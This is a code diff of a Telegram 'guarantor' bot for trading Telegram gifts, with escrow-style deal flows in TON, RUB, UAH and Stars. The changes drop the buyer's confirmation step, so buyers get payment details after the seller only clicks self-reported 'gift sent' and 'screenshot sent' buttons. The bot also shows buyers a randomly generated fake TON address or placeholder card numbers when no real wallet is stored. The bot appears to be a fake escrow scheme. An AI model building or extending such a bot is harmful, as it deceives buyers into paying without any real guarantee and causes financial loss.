@@ -1,217 +1,213 @@
+import 'dotenv/config'
 import { Telegraf, Scenes, session } from 'telegraf'
-import start from './commands/start.js'
+import start, { lastStartMessageId } from './commands/start.js'
 import deeplink from './commands/deeplink.js'
 import niklastore from './commands/niklastore.js'
 import { walletManageScene } from './scenes/walletManage.js'
 import { createDealWizard } from './scenes/createDeal.js'
-import { mainMenuKb, sellerGiftKb, buyerGiftKb } from './keyboards.js'
+import { mainMenuKb, sellerGiftStep1Kb, sellerGiftConfirmKb, sellerShotSentKb } from './keyboards.js'
 import db, { initDB } from './db.js'
 
-/* ======================== INIT DB ========================= */
 await initDB()
+if (!process.env.BOT_TOKEN) {
+  console.error('❌ BOT_TOKEN не задан'); process.exit(1)
+}
 
-/* ======================== INIT BOT ========================= */
 const bot = new Telegraf(process.env.BOT_TOKEN)
 const stage = new Scenes.Stage([walletManageScene, createDealWizard])
 
 bot.use(session())
 bot.use(stage.middleware())
 
-/* ======================== LOAD BOT NAME ==================== */
+// username для диплинков
 let BOT_USERNAME = process.env.BOT_USERNAME || null
-try {
-  const me = await bot.telegram.getMe()
-  if (me?.username) {
-    BOT_USERNAME = me.username
-    process.env.BOT_USERNAME = BOT_USERNAME
+if (!BOT_USERNAME) {
+  try {
+    const me = await bot.telegram.getMe()
+    BOT_USERNAME = me?.username || null
+    if (BOT_USERNAME) process.env.BOT_USERNAME = BOT_USERNAME
+  } catch (e) {
+    console.warn('getMe() failed', e?.description || e?.message || e)
   }
-} catch {}
+}
+console.log('Bot username:', BOT_USERNAME)
 
-console.log('✅ BOT USERNAME:', BOT_USERNAME)
-
-/* ======================== FIXED /START ===================== */
+// /start (не сбрасываем сцену при вводе ссылок)
 bot.start(async (ctx) => {
-  // если пользователь внутри сцены create-deal — игнорируем автоматические /start updates
-  if (ctx.scene?.current?.id === 'create-deal') {
-    return
-  }
-
+  if (ctx.scene?.current?.id === 'create-deal') return
   try { await ctx.scene.leave() } catch {}
-
   if (typeof ctx.startPayload === 'string' && ctx.startPayload.length > 5) {
     return deeplink(ctx)
   }
-
   return start(ctx)
 })
 
-/* ======================== ADMIN MODE ======================= */
+// главное меню
+bot.action('deal:create', async (ctx) => {
+  await ctx.answerCbQuery()
+  if (lastStartMessageId) {
+    try { await ctx.telegram.deleteMessage(ctx.chat.id, lastStartMessageId) } catch {}
+  }
+  return ctx.scene.enter('create-deal')
+})
+bot.action('wallet:manage', async (ctx) => {
+  await ctx.answerCbQuery()
+  if (lastStartMessageId) {
+    try { await ctx.telegram.deleteMessage(ctx.chat.id, lastStartMessageId) } catch {}
+  }
+  return ctx.scene.enter('wallet-manage')
+})
+bot.action('help:how', async (ctx) => {
+  await ctx.answerCbQuery()
+  try { await ctx.telegram.deleteMessage(ctx.chat.id, ctx.callbackQuery.message.message_id) } catch {}
+  await ctx.reply(
+`Как работает:
+
+1) Продавец создаёт сделку → «Ожидаем покупателя».
+2) Покупатель присоединяется → продавцу показываются шаги по подарку.
+3) Продавец: «Подарок отправлен» → «Да, передал(а) подарок» → «📸 Отправил(а) скриншот».
+4) Бот показывает реквизиты оплаты обеим сторонам.
+5) Покупатель оплачивает по реквизитам.`,
+    mainMenuKb()
+  )
+})
+
+// /niklastore
 bot.command('niklastore', async (ctx) => {
   await niklastore(ctx)
 })
 
-/* ======================== JOIN VIA LINK ==================== */
-bot.action(/join:(.+)/, async (ctx) => {
-  await ctx.answerCbQuery()
+// ===== SELLER FLOW =====
 
-  const token = ctx.match[1]
-  await db.read()
-
-  const deal = Object.values(db.data.deals).find((d) => d.token === token)
-  if (!deal) return ctx.reply('Сделка не найдена.')
-
-  if (deal.buyerId === ctx.from.id) {
-    return ctx.reply('Вы уже участвуете в этой сделке.')
-  }
-
-  deal.buyerId = ctx.from.id
-  await db.write()
-
-  try {
-    await ctx.telegram.sendMessage(
-      deal.sellerId,
-      `👤 Покупатель @${ctx.from.username || ctx.from.id} присоединился к сделке.`
-    )
-  } catch {}
-
-  return ctx.reply('✅ Вы присоединились к сделке.\n⏳ Ожидайте действий продавца.')
-})
-
-/* ======================== CREATE DEAL ===================== */
-bot.action('deal:create', async (ctx) => {
-  await ctx.answerCbQuery()
-  try {
-    await ctx.scene.enter('create-deal')
-  } catch (err) {
-    console.log('❌ Ошибка входа в сцену create-deal:', err)
-    ctx.reply('Ошибка. Попробуйте /start.')
-  }
-})
-
-/* ======================== MANAGE WALLET ===================== */
-bot.action('wallet:manage', async (ctx) => {
-  await ctx.answerCbQuery()
-  return ctx.scene.enter('wallet-manage')
-})
-
-/* ======================== SELLER: отправлен подарок ========= */
+// 1) продавец: Подарок отправлен
 bot.action(/seller:gift_sent:(.+)/, async (ctx) => {
   await ctx.answerCbQuery()
-
   const token = ctx.match[1]
   await db.read()
-
-  const deal = Object.values(db.data.deals).find((d) => d.token === token)
+  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
   if (!deal) return ctx.reply('Сделка не найдена.')
-  if (deal.sellerId !== ctx.from.id) return ctx.reply('Это не ваша сделка.')
+  if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')
 
   deal.status = 'gift_sent'
+  deal.log ||= []; deal.log.push('Продавец: нажал «Подарок отправлен».')
   await db.write()
 
   await ctx.reply(
-    '✅ Подарок отправлен!\nПопросите продавца прислать скриншот передачи подарка покупателю.'
+    'Вы точно передали подарок?',
+    sellerGiftConfirmKb(token)
+  )
+})
+
+// 2) продавец подтверждает «Да, передал(а) подарок»
+bot.action(/seller:gift_confirm:(.+)/, async (ctx) => {
+  await ctx.answerCbQuery()
+  const token = ctx.match[1]
+  await db.read()
+  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
+  if (!deal) return ctx.reply('Сделка не найдена.')
+  if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')
+
+  deal.log ||= []; deal.log.push('Продавец подтвердил передачу подарка.')
+  await db.write()
+
+  await ctx.reply(
+    'Пришлите скриншот передачи подарка покупателю.',
+    sellerShotSentKb(token)
   )
 
   if (deal.buyerId) {
     try {
       await ctx.telegram.sendMessage(
         deal.buyerId,
-        '🎁 Продавец отправил подарок гаранту.\nОжидайте скриншот.'
+        '🎁 Продавец подтвердил передачу подарка. Ожидаем скриншот.'
       )
     } catch {}
   }
 })
 
-/* ======================== BUYER: подарок получен ✅ ========= */
-bot.action(/buyer:gift_received:(.+)/, async (ctx) => {
+// 3) продавец: «📸 Отправил(а) скриншот» → показать реквизиты обеим сторонам
+function fakeTon() {
+  const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_'
+  let s = 'UQ'
+  for (let i = 0; i < 46; i++) s += alphabet[Math.floor(Math.random()*alphabet.length)]
+  return s
+}
+function detectRubType(val = '') {
+  const v = (val || '').replace(/\s+/g, '')
+  const looksCard = /^\d{16,19}$/.test(v)
+  const looksPhone = /^(\+7|7|8)\d{10}$/.test(v)
+  return looksCard ? 'card' : (looksPhone ? 'phone' : null)
+}
+bot.action(/seller:shot_sent:(.+)/, async (ctx) => {
   await ctx.answerCbQuery()
-
   const token = ctx.match[1]
   await db.read()
-
-  const deal = Object.values(db.data.deals).find((d) => d.token === token)
+  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
   if (!deal) return ctx.reply('Сделка не найдена.')
-  if (deal.buyerId !== ctx.from.id) return ctx.reply('Вы не покупатель.')
+  if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')
 
-  deal.status = 'gift_received'
+  deal.status = 'await_payment'
+  deal.log ||= []; deal.log.push('Продавец нажал «Скриншот отправлен». Ожидаем оплату.')
   await db.write()
 
   const seller = db.data.users[deal.sellerId] || {}
   const w = seller.wallets || {}
 
-  let payText = generatePaymentText(deal, w)
+  let payLine = ''
+  if (deal.currency === 'TON') {
+    const addr = w.TON || fakeTon()
+    payLine = `Отправьте *${deal.amount} TON* на адрес:\n\`${addr}\``
+  } else if (deal.currency === 'RUB') {
+    const rub = (w.RUB || '').trim()
+    const t = detectRubType(rub)
+    if (t === 'phone') {
+      payLine = `Отправьте *${deal.amount} RUB* на номер телефона:\n\`${rub}\``
+    } else {
+      const card = rub || '2200 1234 5678 9012'
+      payLine = `Отправьте *${deal.amount} RUB* на карту:\n\`${card}\``
+    }
+  } else if (deal.currency === 'UAH') {
+    const card = (w.UAH || '5375 1234 5678 9012').trim()
+    payLine = `Отправьте *${deal.amount} UAH* на карту:\n\`${card}\``
+  } else if (deal.currency === 'STARS') {
+    payLine =
+      `Оплатите *${deal.amount} Stars* через *Fragment* (https://fragment.com) ` +
+      `или *подарками* в Telegram.\n\n_Комиссия на покупателе._`
+  }
 
-  await ctx.reply(payText, { parse_mode: 'Markdown' })
+  const msg =
+`⏳ Ожидание оплаты от покупателя.
 
-  try {
-    await ctx.telegram.sendMessage(deal.sellerId, payText, { parse_mode: 'Markdown' })
-  } catch {}
+${payLine}`
+
+  await ctx.reply('📸 Скриншот зафиксирован. Ожидаем оплату от покупателя.')
+  if (deal.buyerId) { try { await ctx.telegram.sendMessage(deal.buyerId, msg, { parse_mode: 'Markdown' }) } catch {} }
+  try { await ctx.telegram.sendMessage(deal.sellerId, msg, { parse_mode: 'Markdown' }) } catch {}
 })
 
-/* ===================== CANCEL FROM SELLER =================== */
+// продавец отменил
 bot.action(/seller:cancel:(.+)/, async (ctx) => {
   await ctx.answerCbQuery()
   const token = ctx.match[1]
-
   await db.read()
-  const deal = Object.values(db.data.deals).find((d) => d.token === token)
+  const deal = Object.values(db.data.deals || {}).find(d => d.token === token)
   if (!deal) return ctx.reply('Сделка не найдена.')
   if (deal.sellerId !== ctx.from.id) return ctx.reply('Не ваша сделка.')
 
   deal.status = 'canceled'
+  deal.log ||= []; deal.log.push('Продавец отменил сделку.')
   await db.write()
 
   await ctx.reply('❌ Сделка отменена.')
-
-  if (deal.buyerId) {
-    try {
-      await ctx.telegram.sendMessage(deal.buyerId, '❌ Сделка отменена продавцом.')
-    } catch {}
-  }
+  if (deal.buyerId) { try { await ctx.telegram.sendMessage(deal.buyerId, '❌ Сделка отменена продавцом.') } catch {} }
 })
 
-/* ======================== FALLBACK ========================== */
-bot.on('message', async (ctx) => {
-  return ctx.reply('Используйте /start', mainMenuKb())
-})
+// fallback
+bot.on('message', async (ctx) => ctx.reply('Меню: /start', mainMenuKb()))
 
-/* ======================== START BOT ========================= */
-bot.launch()
-console.log('✅ GiftSecureBot RUNNING')
+await bot.telegram.deleteWebhook({ drop_pending_updates: true }).catch(() => {})
+await bot.launch()
+console.log('GiftSecureBot RUNNING ✅')
 
-/* ======================== HELPERS ========================== */
-function generatePaymentText(deal, w) {
-  function fakeTon() {
-    return 'EQC0n8zAbCdEfGhIjKlMnOpQrStUvWxYz0123456789abc'
-  }
-
-  function detectRubType(val = '') {
-    const clean = val.replace(/\s+/g, '')
-    if (/^\d{16,19}$/.test(clean)) return 'card'
-    if (/^(\+7|7|8)\d{10}$/.test(clean)) return 'phone'
-    return null
-  }
-
-  if (deal.currency === 'TON') {
-    const addr = w.TON || fakeTon()
-    return `✅ Подарок подтверждён!\nТеперь отправьте *${deal.amount} TON* на адрес:\n\`${addr}\``
-  }
-
-  if (deal.currency === 'RUB') {
-    const rub = w.RUB || ''
-    const type = detectRubType(rub)
-    if (type === 'phone')
-      return `✅ Подарок подтверждён!\nОтправьте *${deal.amount} RUB* на номер телефона:\n\`${rub}\``
-    const card = rub || '2200 1234 5678 9012'
-    return `✅ Подарок подтверждён!\nОтправьте *${deal.amount} RUB* на карту:\n\`${card}\``
-  }
-
-  if (deal.currency === 'UAH') {
-    const card = w.UAH || '5375 1234 5678 9012'
-    return `✅ Подарок подтверждён!\nОтправьте *${deal.amount} UAH* на карту:\n\`${card}\``
-  }
-
-  if (deal.currency === 'STARS') {
-    return `✅ Подарок подтверждён!\nОплатите *${deal.amount} Stars* через Fragment или подарками.\nКомиссия на покупателе.`
-  }
-}
+process.once('SIGINT', () => bot.stop('SIGINT'))
+process.once('SIGTERM', () => bot.stop('SIGTERM'))
